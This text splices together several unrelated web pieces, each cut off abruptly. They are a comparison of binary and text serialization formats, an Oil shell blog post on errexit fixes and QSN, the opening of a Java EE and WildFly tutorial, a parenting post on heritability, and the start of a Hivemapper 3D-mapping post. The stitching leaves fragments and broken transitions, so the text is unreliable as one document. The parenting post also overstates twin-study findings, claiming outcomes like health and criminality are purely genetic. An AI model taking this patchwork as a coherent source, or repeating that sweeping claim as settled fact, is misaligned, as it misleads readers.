<p>Feels a little like Google’s answer to Cap’n Proto, as it has some of the same design goals – zero-copy serialization and layouts that are more amenable to versioning.</p>
<p><strong>Category:</strong> Machine-readable, schema-defined. Includes RPC protocol.</p>
<p><strong>Users:</strong> Google, Cocos2D, Facebook’s mobile client</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Designed for zero-copy deserialization</li>
<li>Designed for schema to evolve</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Kinda feels like the problem is already solved by capnp</li>
<li>Includes a JSON parser for some reason?</li>
<li>Type system is kinda anemic with regards to unions</li>
</ul>
<h2 id="cbor">CBOR</h2>
<p><a href="https://cbor.io/">https://cbor.io/</a></p>
<p>Basically a binary re-imagining of JSON.</p>
<p><strong>Category:</strong> Machine-readable, self-describing.</p>
<p><strong>Users:</strong> ???</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Pretty good type system – there’s things like fixnum’s, datetime’s, blobs, etc</li>
<li>Compact</li>
<li>Built-in extensibility</li>
<li>Designed to be a drop-in replacement for JSON</li>
<li>IETF standard</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Kinda more complicated than it needs to be, though this is for the sake of compactness and comprehensive types. Numbers are densely packed into fewer bits when possible, for example.</li>
<li>Doesn’t actually seem that widely adopted for some reason?</li>
</ul>
<h2 id="msgpack">Msgpack</h2>
<p><a href="https://msgpack.org/">https://msgpack.org/</a></p>
<p>The Other CBOR, or rather, <a href="https://news.ycombinator.com/item?id=14067747">CBOR is derived from this</a>. Designed to be simple and compact. Kinda a <em>lot</em> like a slightly chopped down CBOR, actually, their integer specification stuff looks nearly identical.</p>
<p><strong>Category:</strong> Machine-readable, self-describing.</p>
<p><strong>Users:</strong> Redis, a few others?</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Simple</li>
<li>Compact</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Specification is kinda weak</li>
<li>No real tuple or enum types</li>
<li>Why not just CBOR?</li>
</ul>
<h2 id="bson">BSON</h2>
<p><a href="http://bsonspec.org/">http://bsonspec.org/</a></p>
<p>As the name implies, a binary-ifcation of JSON. Created by MongoDB as its internal data format.</p>
<p><strong>Category:</strong> Machine-readable, self-describing.</p>
<p><strong>Users:</strong> MongoDB</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Type system is full of deprecated and MongoDB-specific shit but is reasonably pragmatic</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Type system is reasonably pragmatic but is full of deprecated and MongoDB-specific shit</li>
<li><strong>C strings</strong> – though there’s random non-C strings in places as well.</li>
<li>Its arrays are a travesty against serializarion</li>
<li>Basically an implementation detail of MongoDB, and it looks like it</li>
</ul>

<p>Things that are interesting but not actually in the scope of serialization languages, or are otherwise irrelevant.</p>
<h2 id="toml">TOML</h2>
<p><a href="https://github.com/toml-lang/toml">https://github.com/toml-lang/toml</a></p>
<p>Invalid, it’s designed as a config language, not a serialization format. It’s basically an attempt to make something as simple and ubiquitous as windows .INI files that is an actual specification rather than a fashion.</p>
<p><strong>Category:</strong> Human-readable, sorta self-describing though usually you have a specific data structure you’re trying to fit it into.</p>
<p><strong>Users:</strong> Various, notably Cargo (Rust’s build tool)</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Work well as a config language without deeply nested structures</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Works poorly when you try to make deeply nested structures</li>
</ul>
<h2 id="ron">RON</h2>
<p><a href="https://github.com/ron-rs/ron">https://github.com/ron-rs/ron</a></p>
<p>Rusty Object Notation. Because shoehorning Rust’s ML-y type systeminto JSON isn’t very much fun. Works startlingly well for this purpose but is basically untried elsewhere.</p>
<p><strong>Category:</strong> Human-readable, sorta self-describing though usually you have a specific data structure you’re trying to fit it into.</p>
<p><strong>Users:</strong> A few, notably <a href="https://amethyst.rs/">Amethyst</a>.</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Good type system for sophisticated functional-style languages</li>
<li>Simple and reasonably compact</li>
<li>Actually very good at what it does</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Young, underspecified, Rust-centric</li>
</ul>
<h2 id="bincode">Bincode</h2>
<p><a href="https://github.com/servo/bincode">https://github.com/servo/bincode</a></p>
<p>Included mainly for completeness. It’s not standardized outside of a single particular implementation which doesn’t promise stability, so not intended for general-purpose use. It’s intended as a fast and easy RPC/IPC format for Servo, and the actual format is basically an implementation detail of that goal.</p>
<p><strong>Users:</strong> Servo, programs written by introverts who don’t care about being able to talk to each other. (Turns out this is a useful niche though, who knew.)</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Compact, fast, simple.</li>
<li>Works basically transparently for IPC with Rust code.</li>

  2020-10-22
</p>

<p>On a <a href="https://lobste.rs/s/6bphbw/fennel_programming_language_rationale">lobste.rs thread</a> about the rationale for the Fennel language, I
posted this summary of why Oil exists:</p>
<blockquote>
<p>I think these features alone would justify a new shell:</p>
<ol>
<li>Getting rid of "quoting hell"</li>
<li>Getting rid of ad hoc parsing and splitting</li>
<li>Fixing errexit</li>
</ol>
<p>But Oil has a lot more than that, including unifying separate ad hoc
expression languages ...</p>
</blockquote>
<p>This post elaborates on these points.  I've condensed the rationale into four
critical features for the <a href="http://www.oilshell.org/cross-ref.html?tag=osh-language#osh-language">OSH language</a>.</p>
<p>I give examples of each feature, link to docs (in progress), and comment on the
future of the project.</p>
 
<a name="the-osh-language"></a>
<h2>The OSH Language</h2>
<p>Recall that <a href="http://www.oilshell.org/cross-ref.html?tag=osh-language#osh-language">OSH</a> is designed to run existing shell scripts, and
has done that <a href="http://www.oilshell.org/blog/2018/01/15.html">since early 2018</a>.</p>
<p>It also fixes warts in the shell language with <strong>opt-in</strong> features.  These are
the four most important ones.</p>
<a name="reliable-error-handling"></a>
<h3>Reliable Error Handling</h3>
<p>I just finished an overhaul of shell's flaky <code>set -e</code> / <code>errexit</code> mechanism.
I'm excited by this, because I started it last year, but put it on the back
burner after being stumped!</p>
<p>I believe I've figured out every problem now, and would like your feedback.
The simple invariant is that <strong>OSH never loses an exit code</strong>, which is not
true of POSIX shell or <a href="http://www.oilshell.org/cross-ref.html?tag=bash#bash">bash</a>.  Here's a summary of the enhancements:</p>
<ul>
<li><code>strict_errexit</code> - A shell option to <strong>detect</strong> cases where you would lose
errors in shell, like <code>if myfunc</code>.  This improves your shell scripts, even if
you run them under another shell!  In other words, OSH can be used as a dev
tool.</li>
<li><code>inherit_errexit</code> - OSH implements this bash 4.4 option, which is a partial
fix for the "command sub errexit" problem.</li>
<li><code>command_sub_errexit</code> - A shell option to check for failure at the end of
every command sub, so you don't lose errors.
<ul>
<li>This fixes the problem shown in the last panel of a <a href="https://wizardzines.com/comics/bash-functions/">recent
comic by Julia Evans</a>:
<em>"bash is weird sometimes"</em></li>
</ul>
</li>
<li><code>process_sub_fail</code> - Like <code>pipefail</code>, but for process substitutions.  It
allows <code>errexit</code> to "see" the failure caused by process subs, like the <code>sort</code>
invocation in <code>cat foo.txt &lt;(sort /oops/error)</code>,
<ul>
<li><code>@_process_sub_status</code>: A variable that's analogous to <code>${PIPESTATUS[@]}</code>.
You may want to inspect the exit status of all processes.</li>
</ul>
</li>
<li>The <code>run</code> builtin turns <code>errexit</code> back on, so <code>if run myfunc</code> is safe.  It
also provides fine-grained control over exit codes.</li>
</ul>
<p>Yes, there are many solutions, because shell has many problems!  But you don't
have to remember all these names.  Add <code>shopt --set oil:basic</code> to the top of
your program to turn all options.  The <code>strict_errexit</code> failures will remind
you to use the <code>run</code> wrapper.</p>
<p>(Aside: I was able to fix all these problems cleanly in the interpreter.  I
spent time a lot of time on <a href="https://www.oilshell.org/blog/2016/11/29.html">Oil's architecture 4 years
ago</a> precisely so I could fix
such subtle problems.  When the code has a good structure, the "right place"
for a fix reveals itself to you.  Oil is still improving!)</p>
<a name="safe-processing-of-user-supplied-data-like-filenames"></a>
<h3>Safe Processing of User-Supplied Data (like filenames)</h3>
<p><a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a> is the foundation for <a href="https://github.com/oilshell/oil/wiki/Structured-Data-in-Oil">Structured Data in
Oil</a>.  It removes
the need to invent ad hoc (and often broken) formats every time you need to
deal with user-supplied data in shell.  In other words, Oil scripts have an
alternative to messy parsing and splitting.</p>
<p>I just implemented a <a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a> decoder, after implementing an encoder earlier
this year.</p>
<p>Here are some short examples.  The <code>write</code> builtin prints its args to stdout,
and it accepts a <code>--qsn</code> flag:</p>
<pre><code># Print filenames ONE PER LINE.  If a name contains a
# newline or other special char, it's QSN-encoded like
# 'multi-line \n name with NUL \0 byte'

write --qsn -- *.txt
</code></pre>
<p>The <code>read</code> builtin provides the inverse:</p>
<pre><code>cat list.txt | while read --line --qsn {
  # _line is implictly set by 'read'
  rm -- $_line
}
</code></pre>
<p>I also implemented <code>read -0</code> as a synonym for bash's obscure <code>read -r -d ''</code>.
This allows you to consume <code>find -print0</code> output in shell, like <code>xargs -0</code>
does.  This format is distinct from QSN, but it's now easy to convert back and
forth between them.</p>
<p>This is the first cut of <a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a> support.  I expect it to evolve based on your
feedback!</p>

in HTML</a> (2017).</li>
</ul>
<a name="eliminate-quoting-hell-the-qefs-problem"></a>
<h3>Eliminate Quoting Hell (the <code>!qefs</code> problem)</h3>
<p>This was done in summer 2019.  I described it in <a href="http://www.oilshell.org/release/latest/doc/simple-word-eval.html">Simple Word
Evaluation</a> earlier this year, and you can see examples in
<a href="http://www.oilshell.org/release/latest/doc/idioms.html">Oil Language Idioms</a>.</p>
<p>Briefly, Oil allows this:</p>
<pre><code>ls @myflags $filename
</code></pre>
<p>instead of</p>
<pre><code>ls "${myflags[@]}" "$filename"
</code></pre>
<p>Notice the <code>@</code> splice operator, and lack of quotes.</p>
<a name="static-parsing-enables-better-error-messages-and-tools"></a>
<h3>Static Parsing Enables Better Error Messages and Tools</h3>
<p>This blog began in 2016 with an explanation of <a href="http://www.oilshell.org/blog/2016/10/22.html">static
parsing</a>.  I didn't mention it in the comment quoted in
the intro, but it's still a crucial part of the project.</p>
<p>I was reminded how important this is when noticing that the authors of both
Perl 5 and the rc shell <a href="https://lobste.rs/s/7bpgbl/rc_plan_9_shell#c_mokqrn">made complaints about shell's dynamic
parsing</a>, going back 20-30
years!</p>
<p>This foundation is still paying dividends.  I recently used the static parser
to create detailed error messages for command subs:</p>
<pre><code><span>$</span> <span>shopt --set errexit command_sub_errexit</span>

<span>$</span> <span>d=$(date %x)</span>
date: invalid date ‘%x’
  d=$(date %x)
    ^~
[ interactive ]:13: fatal: Command sub exited with status 1 ...
</code></pre>
<p>and process subs:</p>
<pre><code><span>$</span> <span>shopt --set process_sub_fail</span>

<span>$</span> <span>cat /dev/null &lt;(sort oops)</span>
sort: cannot read: oops: No such file or directory
  cat /dev/null &lt;(sort oops)
                ^~
[ interactive ]:27: fatal: Exiting with status 2 ...
</code></pre>
<p>We point to the location of the failing construct.  No other shell does this!</p>
<p>In addition, Travis Everett has worked on a shell dependency bundler which
relies on static parsing.</p>
<ul>
<li>Related: The new <a href="http://www.oilshell.org/release/latest/doc/syntactic-concepts.html">Syntactic Concepts</a> doc lists static parsing as
one of 5 important concepts.</li>
</ul>
<a name="whats-next-for-the-project"></a>
<h2>What's Next For the Project?</h2>
<p>It was indeed useful to explicitly write out rationale for the language.  I've
done that many times with posts tagged #<a href="http://www.oilshell.org/blog/tags.html?tag=why-a-new-shell#why-a-new-shell">why-a-new-shell</a>, but
explaining it again helps, even after 4 years.  The project is evolving and
getting crisper.</p>
<a name="a-very-important-claim"></a>
<h3>A Very Important Claim</h3>
<p>With the overhaul of <code>errexit</code> and the <a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a> decoder, I believe we now have
all the bases for the <a href="http://www.oilshell.org/cross-ref.html?tag=osh-language#osh-language">OSH language</a> covered!  These features
will be out with the next release.</p>
<p>The claim is that <strong>these four features alone justify a new Unix shell</strong>.  If
we finish the C++ translation, and end the project here, it would be
worthwhile.</p>
<p>To repeat, they are:</p>
<ol>
<li>Reliable error handling.  I can't recommend shell to my friends without
these fixes.</li>
<li>Safe processing of user-supplied data, i.e. an alternative to ad hoc parsing
and splitting.</li>
<li>Elimination of "quoting hell".  Let's fix it once and for all, rather than
admonishing every new shell programmer about it for the next 30 years, as
has been done for the past 30!</li>
<li>Static Parsing for better error messages and tools.  It also removes a
security issue.</li>
</ol>
<p>If you disagree, <a href="https://old.reddit.com/r/oilshell/comments/jg54gd/four_features_that_justify_a_new_unix_shell/?">let me know</a>!  I would like to hear what other
warts in the <strong>shell language</strong> need to be fixed or otherwise addressed.</p>
<p>(I'm leaving out the interactive shell here, as I believe the first priority is
a better shell for programming and automation.  A "cloud shell", if you will.)</p>
<a name="reviewing-the-biggest-cut-january-2020"></a>
<h3>Reviewing The Biggest Cut (January 2020)</h3>
<p>Back in January, I was already <strong>concerned about the scope</strong> of the project.  I
wrote that <a href="http://www.oilshell.org/blog/2020/01/ambitions.html#the-biggest-cut">the biggest cut</a> to the
project would be that Oil would be based on <strong>strings</strong>, rather than
Python-like data types.</p>
<p>Let me update that statement based on these crisp definitions:</p>
<ul>
<li>The <a href="http://www.oilshell.org/cross-ref.html?tag=osh-language#osh-language">OSH language</a> is a compatible shell based on <strong>strings</strong>
(and arrays of strings).  Assignments look like <code>local x=mystr</code>.</li>
<li>The <a href="http://www.oilshell.org/cross-ref.html?tag=oil-language#oil-language">Oil language</a> has Python-like <strong>types and expressions</strong>.
Assignments look like <code>var x = 42 + a[i] + f(x, y)</code>.  It has a
garbage-collected heap of recursive data structures.</li>
</ul>
<p>So what I'm saying now is that the priority going forward is to
<strong>polish the OSH language</strong>, and put off the Oil language until the hazy
future.</p>
<p>That means finishing the translation to C++, hooking up the <a href="http://www.oilshell.org/blog/2020/08/risks.html#garbage-collection">garbage
collector</a>, and writing <a href="http://www.oilshell.org/release/latest/doc">documentation</a>.  It may mean preparing the code to
be embedded in another application, like the <a href="http://www.oilshell.org/cross-ref.html?tag=fish#fish">fish</a> shell.  (I've
<a href="https://github.com/oilshell/oil/wiki/Fish-Oil-Brainstorming">discussed this</a>
with the maintainer, and there's some interest.  But it's a lot of work, which
shouldn't be taken for granted, and there are unsolved problems.)</p>
<p>Achieving this OSH language milestone feels very doable, since everything
already works in Python, and something like <strong>915</strong> out of <strong>1685</strong> spec tests
pass in C++ (yielding a 30x - 50x speedup).</p>

<a name="oil-language-updates"></a>
<h3>Oil Language Updates</h3>
<p>But I'm not giving up on the Oil language!  I just need help. It exists in
prototype form, and your feedback will motivate me to work on it.</p>
<p>Here are some blog posts I want to write, to get the word out:</p>
<p><em>Four Features of the Oil Language</em>.  This post narrowed down OSH to four major
features, and Oil also has four:</p>
<ol>
<li>Python-like expressions, along with <a href="http://www.oilshell.org/release/latest/doc/eggex.html">eggexes</a></li>
<li>Ruby-like blocks, which enable DSLs and declarative configuration</li>
<li>procs (shell functions with signatures, <a href="http://www.oilshell.org/blog/tags.html?tag=shell-the-good-parts#shell-the-good-parts">which compose in unique
ways</a>)</li>
<li>Serialization formats like JSON and QTSV
(<a href="https://github.com/oilshell/oil/wiki/TSV2-Proposal">proposal</a>).  The
latter is a format for <a href="http://www.oilshell.org/blog/2018/11/30.html">typed tables</a>, built on top
of <a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a>.</li>
</ol>
<p>We have working prototypes for every feature except QTSV.  You can <a href="http://oilshell.org/release/latest/">try them
now</a>!</p>
<p><em>Big Changes to the Oil Language</em>.  A list of recent changes I've made, which
should give potential contributors a feel for the language.</p>
<p><em>What Distinguishes Python, JS, and Ruby from Perl and PHP</em>.   The former
languages have a clean data model / memory model: a garbage collected heap with
reference semantics.</p>
<p>The latter languages have warts in their model.  Oil adds the clean model to
shell.</p>
<p><em>Comments on Comics</em>.  I can use these <a href="https://wizardzines.com/comics/bash-errors/">recent
comics</a> as a way to explain the
<a href="http://www.oilshell.org/cross-ref.html?tag=osh-language#osh-language">OSH language</a>.  (See other posts tagged #<a href="http://www.oilshell.org/blog/tags.html?tag=comic#comic">comic</a>.)</p>

<a name="summary"></a>
<h2>Summary</h2>
<p>I described 4 essential features of an improved shell language.  <a href="https://old.reddit.com/r/oilshell/comments/jg54gd/four_features_that_justify_a_new_unix_shell/?">Let me
know</a> what you think is missing.</p>
<p>If you haven't read it already, see <a href="http://www.oilshell.org/blog/2018/01/28.html">Why Create a Unix
Shell?</a>.  It's the most popular page on this site,
though I still need to update it for 2021.</p>
<p>I then proposed a focus on making the OSH language "production ready".  I'm
still going to work on the Oil language, but I need help finishing it.</p>

<!-- Once Jakarta EE 9 is officially released (and WildFly 21 supports it): -->
<!-- DUPLICATE this article so you have two articles - one for Java EE and one for Jakarta EE: -->
<!-- Bring the new Jakarta EE article up to date as follows: -->
<!-- * Update all titles to: 'A Thorough Introduction to Jakarta EE (Formerly Known as Java EE) -->
<!-- * Update poster image -->
<!-- * Update WildFly + Java version -->
<!-- * Update GitHub project to use the Jakarta EE 9 platform API -->
<!-- * Update article introduction to write something about the Java EE / Jakarta EE naming situation -->

<p>The two most popular Java frameworks for server-side application development are <strong>Java EE</strong> (<em>Enterprise Edition</em>) and <strong>Spring</strong>.
Java EE is the <em>official</em> specification,
whereas Spring (unofficially) describes pretty much the same functionality,
but in many cases does so in a slightly different, often easier way.</p>
<p>(Later on, we'll go into greater detail about what the Java EE specification <em>is</em>, and what the term actually means.)</p>
<p>Should you use Java EE for your next projects, then? No, probably not.
Because what's important to know about Java EE, is that it's a comparatively heavy framework,
in terms of both setup and actually running it (in production).
The Java EE framework has greatly improved over the last decade,
but in terms of documentation, ease-of-use and operational simplicity,
it still doesn't match up against <a href="https://spring.io/projects/spring-boot">Spring Boot</a>.</p>
<p>Becoming knowledgeable in Java EE can still be worthwile, though.
For example, if you're looking to expand your software consultancy services to enterprise clients.
The <em>EE</em> part of Java EE (Enterprise Edition) is still very fitting,
as the framework is still almost exclusively used by the enterprises and BigCo's like
banks, insurance companies, government agencies, S&amp;P500, AEX, etc.</p>
<p>After a general introduction, as well as an overview of the framework's terminology,
we'll be setting up a Java EE project from scratch,
the full source code of which can be found on <a href="https://github.com/jessym/tutorials/tree/master/a-complete-introduction-to-java-ee">GitHub</a>.

<p>Java EE is a Java framework for developing server-side applications.
Among other things, it allows you to:</p>
<ul>
<li>create web APIs by accepting incoming HTTP requests</li>
<li>save and retrieve data from databases</li>
<li>send and receive messages from message brokers</li>
<li>connect to other backend systems via HTTP or SOAP</li>
<li>package applications into single units of deployment (.war files)</li>
</ul>
<p>The framework is very much geared towards enterprises and big corporations.
As such, it often ends up being popular in the domains of banking, insurance, accounting, finance, and manufacturing.</p>
<p>Like the programming language Java itself, Java EE used to be owned and managed by
<a href="https://en.wikipedia.org/wiki/Oracle_Corporation">Oracle</a>.
However, between 2017 and 2019, Oracle has transfered the ownership of the Java EE framework to the
<a href="https://en.wikipedia.org/wiki/Eclipse_Foundation">Eclipse Foundation</a>,
resulting in the framework being renamed <em>Jakarta EE</em> from version 8-9 onward.</p>

<p>It's going to take time for the term Jakarta EE to really catch on,
as the term Java EE is still very much ingrained in the corporate software industry.</p>
<p>We will be setting up a <strong>Java EE 8</strong> application in the build-along section of this article.</p>
<a href="#specifications-and-apis"><h2 id="specifications-and-apis">Specifications and APIs</h2></a>
<p>You should think of Java EE as a collection of <em>recipes</em>.
Recipes for typical pieces of functionality within a server application.
The technical term for a Java EE recipe is a <em>Java Specification Request</em> (JSR),
and each JSR describes a single unit of functionality within the Java EE framework.
For example:</p>
<ul>
<li>Creating a RESTful web API? <strong>JSR 370</strong></li>
<li>Validating incoming HTTP request bodies? <strong>JSR 380</strong></li>
<li>Connecting and reading (or writing) from a database? <strong>JSR 338</strong></li>
<li>Publishing messages to a message broker? <strong>JSR 343</strong></li>
</ul>
<p>This modular setup lets developers pick and choose which parts of the framework they want to use.</p>
<p>In an actual project, this typically means that your application has a single Maven dependency on the
<a href="https://mvnrepository.com/artifact/javax/javaee-api">full Java EE API</a>.</p>
<p>And what's interesting to understand, is that these Java EE API modules consist of nothing but interfaces, annotations and simple POJOs.
<em>There is no actual Java EE framework functionality in <strong>any</strong> of these API modules.</em>
The <em>real</em> implementation of the Java EE specifications, interfaces and annotations lies with the host environment
in which your Java application(s) will be running.
And such host environments are referred to as <strong>Java EE application servers</strong>, or simply <strong>(application) servers</strong>.</p>
<a href="#application-servers-and-implementations"><h2 id="application-servers-and-implementations">Application Servers and Implementations</h2></a>
<p>Java EE applications can't stand on their own—they require a <em>Java EE application server</em> to run in,
because the server provides the application with the facilities it needs to carry out its tasks.</p>
<p>This ties back to the story about JSRs (Java Specification Requests) from earlier.
Since your application only depends on Java EE <strong>API</strong> modules,
it's agnostic of the actual implementation of these modules (at least in theory 😅).
It's up to the application server to provide the actual (runtime) <strong>implementations</strong> to these API modules.</p>
<p><img src="https://www.jessym.com/articles/a-complete-introduction-to-java-ee/application-server.svg" alt="application server diagram with multiple deployments and multiple runtime implementation JAR files"></p>
<p>The image above should make clear that Java EE application servers are to be thought of as facilitating environments,
in which multiple (unrelated) Java apps from different teams or departments
can simaltuneously run alongside each other, each application pseudo-isolated from its neighbours.</p>
<p>An application server doesn't have to implement every single Java EE specification, though.
Different servers can have varying degrees of specification <em>compliance</em>.</p>
<p>For example, the <a href="http://tomcat.apache.org/">Apache Tomcat</a> server only implements the web layer of the
Java EE specification and, as such, is referred to as a <strong>web server</strong>.
The <a href="https://www.wildfly.org/">JBoss WildFly</a> server, on the other hand,
implements every part of the Java EE specification, and can therefore be referred to as a <strong>(Full) Java EE application server</strong>.</p>
<p>Below's an overview of the most popular Java EE servers.</p>

<p>When deploying a Java EE application to some server, there will be lots of additional libraries available on the classpath at runtime.
These are all <em>implementation libraries</em> for the different Java EE API modules which the application might depend on.
So there's a big difference between <em>compile-time</em> API libraries and <em>runtime</em> implementation libraries.</p>
<hr>
<p>For example, by having a Maven <em>compile</em> dependency on the (full) <a href="https://mvnrepository.com/artifact/javax/javaee-api">Java EE API</a> library,
you'll be able to decorate your classes and methods with the <code>@Path</code> and <code>@GET</code> annotations (part of JSR 370)
and create a simple HTTP endpoint like this:</p>
<pre><code><span>@Path</span><span>(</span><span>"/ping"</span><span>)</span>
<span>public</span> <span>class</span> <span>PingResource</span> <span>{</span>

    <span>@GET</span>
    <span>public</span> <span>Response</span> <span>ping</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> <span>Response</span><span>.</span><span>ok</span><span>(</span><span>"Ping"</span><span>)</span><span>.</span><span>build</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>

<span>}</span></code></pre>
<p>In and of themselves, Java runtime annotations don't do anything.
That's why the application server has an <em>implementation library</em> for JSR 370, which it places on the classpath during runtime.
This implementation would then have a built-in mechanism which scans your application for all classes with the <code>@Path</code> annotation,
and register them as HTTP endpoints.</p>
<hr>
<p>Server developers typically choose to implement most of the <a href="https://jcp.org/en/jsr/all">500+</a> JSRs themselves.
Often, these implementation are then packaged into standalone libraries so that, in theory,
they can be re-used by other server developers.</p>
<p>As such, there are typically only 1 or 2 popular implementation libraries for each specification,
which may or may not find their way into the standard configuration of multiple different application servers over time.</p>

<a href="#jboss-wildfly"><h2 id="jboss-wildfly">JBoss WildFly</h2></a>
<p>JBoss used to be the name of a company which has developed one of the most popular Java EE application servers in the world:
<a href="https://www.redhat.com/en/technologies/jboss-middleware/application-platform">JBoss EAP</a> (Enterprise Application Platform).
The other application server which JBoss is known for, is called <a href="https://www.wildfly.org/">WildFly</a>.
The difference? Technically, nothing.
WildFly is the free community edition
and JBoss EAP is the paid enterprise edition (with official support)
of the <em>same</em> application server.</p>
<p>As a sidenote, JBoss actually got acquired by <a href="https://www.redhat.com/">RedHat</a> in 2006.
And then, in 2019, RedHat got acquired by <a href="https://www.ibm.com/">IBM</a>.
So the JBoss EAP / WildFly server is technically part of IBM's portfolio now,
together with IBM's self-developed Java EE application server called <a href="https://www.ibm.com/cloud/websphere-application-platform/">WebSphere</a>.</p>
<p>We'll be working with the <strong>JBoss WildFly</strong> application server (version <strong>20</strong>) in the build-along section of this article.</p>
<a href="#project-overview"></a>
<p>We'll be working on a Java EE application with the following features:</p>
<ul>
<li>customers can sign up via the <code>POST /accounts</code> endpoint<ul>
<li>their <code>name</code> and <code>email</code> are saved into the database</li>
<li>they're sent a welcome e-mail</li>
</ul>
</li>
<li>all accounts can be queried via the <code>GET /accounts</code> endpoint</li>
<li>a single account can be queried via the <code>GET /accounts/{id}</code> endpoint</li>
</ul>
<p><img src="https://www.jessym.com/articles/a-complete-introduction-to-java-ee/project-overview.svg" alt="diagram containing the basic 3-tiered architecture: resource, service and repository"></p>
<p>You can find the full source code of the final application on
<a href="https://github.com/jessym/tutorials/tree/master/a-complete-introduction-to-java-ee">GitHub</a>.
If you would like to follow along, please make sure to have the following tools installed:</p>
<ul>
<li><strong>Java 11</strong> - newer language versions aren't supported by the WildFly version we're going to pick later</li>
<li><strong>Maven</strong></li>
<li><strong>Docker Compose</strong> - for running the database locally</li>
<li><strong>IntelliJ</strong></li>
</ul>
<a href="#wildfly-setup"></a>
<p>Start out by downloading the <strong>JBoss WildFly 20.0.0.Final</strong> application server (Java EE Full &amp; Web Distribution)
from the official <a href="https://www.wildfly.org/downloads/">downloads page</a>.
Once it's downloaded, unzip the the archive to a convenient location or simply leave it
inside your <code>~/Downloads/</code> folder (which is what I will do).</p>
<p>I shall refer to the WildFly root directory as <code>$JBOSS_HOME</code> from now on,
which would resolve to <code>~/Downloads/wildfly-20.0.0.Final/</code> on my system.</p>
<p>To <em>start</em> this server, simply <code>cd</code> into the <code>$JBOSS_HOME/bin/</code> folder and run the <code>./standalone.sh</code> script.
After a few seconds, you should be able to visit <a href="http://localhost:8080/">localhost:8080</a>
and be greeted with the following welcome screen.</p>
<p><img src="https://www.jessym.com/articles/a-complete-introduction-to-java-ee/wildfly-welcome-screen.png" alt="WildFly welcome screen"></p>
<p>(To stop the server,
simply press Cmd + C or Ctrl + C from the terminal window where the <code>./standalone.sh</code> script is running.)</p>
<p>WildFly also comes with a useful management dashboard, available at <a href="http://localhost:9990/">localhost:9990</a>,
from where we'll be able to view runtime stats about WildFly itself and all Java EE applications deployed to it.
In order to access the dashboard, we'll have to create a management user first, though.
To do so, <code>cd</code> into <code>$JBOSS_HOME/bin/</code> and run the <code>./add-user.sh</code> script.</p>

<p>Every parent should read this article: <a href="https://www.todaysparent.com/family/nature-vs-nurture-does-parenting-even-matter/">Does parenting even matter?</a></p>



<p>Here are some money quotes.</p>



<p><em>On the things we think are important:</em></p>



<blockquote><p>Things like which school your child goes to, whether they travel, how many books you read them when they’re small and how hard (or if) you push them into certain activities, aren’t likely to have much, if any, effect on who they fundamentally are now, or who they become.</p></blockquote>



<p><em>On changing their personality:</em></p>



<blockquote><p>If your child is defiant and strong-willed, they’re almost certainly going to spend their life challenging authority whether you run your household on a strict military timetable or unschool them in a yurt.</p></blockquote>



<p><em>On setting them up for success:</em></p>



<blockquote><p>Many character traits widely assumed to be the result of environmental factors and social conditioning—like curiosity, diligence, intelligence, fastidiousness, academic inclination and drive—are, in fact, highly heritable.&nbsp;</p></blockquote>



<p><em>On why parenting still matters:</em></p>



<blockquote><p>Parenting does matter—of course it does—just not in the overly complicated, competitive, anxiety-ridden way most of us have been led to believe. Our kids are born who they are. As parents, it’s our job to love, support, accept and enjoy them. The rest is gravy.</p></blockquote>



<p>The book <a href="https://www.goodreads.com/book/show/10266902-selfish-reasons-to-have-more-kids">Selfish Reasons to Have More Kids</a> is all about this concept. If you meet a very low bar for parenting then your kids are going to turn out how they’re going to turn out. </p>



<p>There are decades of identical twin and adoption studies to back it up. Those studies have only linked a few things to upbringing. Religious and political affiliation are two examples. </p>



<p>Everything else has little to no correlation. That includes salary, education level, health (smoking/drinking, cavities, etc.), grades in school, criminal behavior, etc. It’s genetics all the way down for those.</p>



<p>That’s disturbing, right? There’s nothing I can do to help my kids grow up to be healthy or well paid or educated? Yeah, but it’s also freeing. Our job is to love our kids and give them happy memories to look back on. We can focus on the fun stuff, because that’s the stuff that matters. The rest, as the article says, is gravy.</p>

The lack of large scale affordable and accurate 3D maps remain a key obstacle preventing the autonomous transportation promise from becoming an everyday reality.</p><p id="673f">We believe there are three pillars required to build and deliver a decentralized mapping network capable of turning 3D maps into an affordable and accessible utility for businesses and machines that require up-to-date maps.</p><p id="b314">When anyone with a commodity dashcam or drone can collect and contribute video it shifts the challenge from a costly logistics and hardware problem into a challenging software opportunity.</p><p id="1ba7">The <a rel="noopener" href="https://blog.hivemapper.com/engineering-a-living-map-introduction-4d4b3e5f28e8">technical breakthrough</a> of Hivemapper is that, leveraging modern compute power we can take nearly any source video of the physical world and convert it into an accurate 3D map. Additionally, the Hivemapper technology does not require all of the video to be produced by one source in a highly structured and organized way. Instead, Hivemapper receives, processes and transforms disparate videos into an accurate and intelligent 3D map.</p><p id="22f6">Think of the Hivemapper map as a puzzle where each video uploaded to Hivemapper forms one piece. The puzzle is only complete when each piece is in its proper place and Hivemapper makes all of the individual pieces come together. This core technology enables a decentralized network of contributors.</p><p id="e3d4">Our approach combining commodity video collections tools from different collectors with our mapping software produced this 50 sq km map around <a href="https://hivemapper.com/map?content=terrain&amp;content=context&amp;content=hmmap&amp;content-filters=color,highacc&amp;overlays=osm-planet&amp;view=-2698768.77,-4293712.18,3856567.37,-2.296,-0.709" rel="noopener">Stanford University</a>:</p></div></div><div><div><div><figure><div></div><figcaption>50 sq km of Silicon Valley built by dashcam and drones</figcaption></figure></div></div></div><div><div><p id="abad">How we built this map</p><ul><li 